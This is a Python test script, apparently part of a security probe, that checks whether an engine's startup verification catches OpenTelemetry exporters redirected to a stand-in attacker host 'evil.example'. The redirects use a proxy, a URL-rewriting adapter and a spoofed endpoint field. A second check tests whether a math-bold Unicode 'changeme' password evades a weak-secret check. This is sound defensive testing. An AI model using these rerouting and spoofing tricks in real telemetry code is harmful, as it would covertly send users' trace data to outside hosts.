# Supplement to security-probe-rework2.py: section 3 with an accepted (InMemory) spy so verification
# is decided by the shape under test alone; corrected math-bold case for section 5.
import contextlib, socket, sys
from unittest import mock
sys.path.insert(0, "/work")
import requests
from requests.adapters import HTTPAdapter
from opentelemetry import trace
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import SimpleSpanProcessor
from opentelemetry.sdk.trace.export.in_memory_span_exporter import InMemorySpanExporter
from opentelemetry.exporter.otlp.proto.http.trace_exporter import OTLPSpanExporter
import opentelemetry.exporter.otlp.common.http as otlp_http
from tests.engine_support import base_env, environ
from engine.config import Settings, ConfigError
from engine.errors import StartupRefused
import engine.startup as st
import harness_telemetry.tracing as _ht

def reset():
    p = trace.get_tracer_provider()
    with contextlib.suppress(Exception): p.shutdown()
    trace._TRACER_PROVIDER = None; trace._TRACER_PROVIDER_SET_ONCE._done = False
    _ht._tracer = trace.get_tracer("harness_telemetry")
P = "http://evil.example:3128"
def sess(proxies=None):
    s = requests.Session(); s.trust_env = False
    if proxies: s.proxies.update(proxies)
    return s
class RerouteAdapter(HTTPAdapter):
    def send(self, request, **k):
        request.url = "http://evil.example:9/v1/traces"; return super().send(request, **k)
def mounted():
    s = sess(); s.mount("http://", RerouteAdapter()); return s
def mismatch():
    ex = OTLPSpanExporter("http://evil.example:9/v1/traces", session=sess()); ex._endpoint = "http://localhost:6006/v1/traces"; return ex
print("### 3b. Installed provider = [shape, InMemory spy]; full startup(); hosts dialled by the shape")
shapes = [
    ("OTLP local trust_env False (control, accepted)", lambda: OTLPSpanExporter("http://localhost:6006/v1/traces", session=sess())),
    ("OTLP local trust_env False + session.proxies", lambda: OTLPSpanExporter("http://localhost:6006/v1/traces", session=sess({"http": P}))),
    ("OTLP local trust_env False + rerouting adapter", lambda: OTLPSpanExporter("http://localhost:6006/v1/traces", session=mounted())),
    ("OTLP evil, _endpoint rewritten to localhost", mismatch),
]
for slabel, ov in [("passing ci", dict(KE_ENV="ci")), ("auth off ci", dict(KE_ENV="ci", KE_AUTH__ENABLED="false"))]:
    for label, mk in shapes:
        hosts = []
        def gai(h, *a, **k): hosts.append(str(h)); raise OSError("spy")
        def cc(addr, *a, **k): hosts.append(str(addr[0])); raise OSError("spy")
        with environ(base_env(**ov)), mock.patch("socket.getaddrinfo", gai), mock.patch("socket.create_connection", cc), mock.patch.object(otlp_http, "_MAX_RETRIES", 1):
            reset(); mem = InMemorySpanExporter(); p = TracerProvider()
            p.add_span_processor(SimpleSpanProcessor(mk())); p.add_span_processor(SimpleSpanProcessor(mem)); trace.set_tracer_provider(p)
            try: st.startup(); out = "startup OK"
            except (StartupRefused, ConfigError) as x: out = "refused %s" % getattr(x, "setting", type(x).__name__)
        print("%-12s %-48s %-28s spans=%d dialled=%s" % (slabel, label, out, len(mem.get_finished_spans()), sorted(set(hosts))))
reset()
print("### 5b. corrected math bold")
mb = "".join(chr(0x1D41A + ord(c) - 97) for c in "changeme")
with environ(base_env(KE_ENV="ci", KE_STORES__POSTGRES__PASSWORD=mb + "-x")):
    try: st.check(Settings()); print("math bold changeme: STARTS")
    except StartupRefused: print("math bold changeme: refused")
